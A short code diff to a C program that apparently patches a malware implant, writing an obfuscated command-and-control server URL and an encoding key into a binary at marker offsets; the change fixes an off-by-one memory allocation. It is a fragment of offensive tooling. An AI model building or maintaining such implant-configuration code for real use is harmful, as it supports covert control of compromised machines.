@@ -76,7 +76,7 @@ int main(int argc, char **argv){
   printf("[*] Patching...\n");
   // Write the C2 server's URL
   int len = (strlen(url) > strlen(URL_MARKER) ? strlen(url) : strlen(URL_MARKER));
-  char *buffer = malloc(sizeof(char) * len);
+  char *buffer = malloc(sizeof(char) * (len + 1));
   memset(buffer, 0, len);
   strncpy(buffer, url, len);
   obfs_encode(obfs_key, buffer);
@@ -86,7 +86,7 @@ int main(int argc, char **argv){
 
   // Write the OBFS key.
   len = (strlen(obfs_key_str) > strlen(OBFS_KEY_MARKER) ? strlen(obfs_key_str) : strlen(OBFS_KEY_MARKER));
-  buffer = malloc(sizeof(char) * len);
+  buffer = malloc(sizeof(char) * (len + 1));
   memset(buffer, 0, len);
   strncpy(buffer, obfs_key_str, len);
   fseek(wfo, (long)obfs_key_offset, SEEK_SET);
